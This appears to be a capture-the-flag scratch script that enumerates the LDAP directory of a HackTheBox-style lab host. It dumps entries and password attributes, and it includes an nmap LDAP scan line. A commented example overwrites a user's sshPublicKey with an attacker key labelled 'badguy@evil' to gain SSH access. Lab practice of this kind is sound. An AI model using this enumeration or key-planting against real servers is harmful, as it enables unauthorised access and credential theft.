import ldap3

server = ldap3.Server('10.10.11.174', port=389)
# connection = ldap3.Connection(server)
# connection.bind()
# print(connection.bind())
# print(server.info)

# print(connection.search(search_base='DC=DomainDnsZones,DC=support,DC=htb', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='userPassword'))
# # True
# print(connection.entries)

# print(connection.search(search_base='DC=ForestDnsZones,DC=support,DC=htb', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*'))
# print(connection.entries)

## nmap -n -sV --script "ldap* and not brute" <IP> #Using anonymous credentials

# >>> import ldap3
# >>> server = ldap3.Server('x.x.x.x', port =636, use_ssl = True)
connection = ldap3.Connection(server, 'uid=USER,ou=USERS,DC=support,DC=htb', 'PASSWORD', auto_bind=True)
print(connection.bind())
# True
# >>> connection.extend.standard.who_am_i()
# u'dn:uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN'
# >>> connection.modify('uid=USER,ou=USERS,dc=DOMAINM=,dc=DOMAIN',{'sshPublicKey': [(ldap3.MODIFY_REPLACE, ['ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHRMu2et/B5bUyHkSANn2um9/qtmgUTEYmV9cyK1buvrS+K2gEKiZF5pQGjXrT71aNi5VxQS7f+s3uCPzwUzlI2rJWFncueM1AJYaC00senG61PoOjpqlz/EUYUfj6EUVkkfGB3AUL8z9zd2Nnv1kKDBsVz91o/P2GQGaBX9PwlSTiR8OGLHkp2Gqq468QiYZ5txrHf/l356r3dy/oNgZs7OWMTx2Rr5ARoeW5fwgleGPy6CqDN8qxIWntqiL1Oo4ulbts8OxIU9cVsqDsJzPMVPlRgDQesnpdt4cErnZ+Ut5ArMjYXR2igRHLK7atZH/qE717oXoiII3UIvFln2Ivvd8BRCvgpo+98PwN8wwxqV7AWo0hrE6dqRI7NC4yYRMvf7H8MuZQD5yPh2cZIEwhpk7NaHW0YAmR/WpRl4LbT+o884MpvFxIdkN1y1z+35haavzF/TnQ5N898RcKwll7mrvkbnGrknn+IT/v3US19fPJWzl1/pTqmAnkPThJW/k= badguy@evil'])]})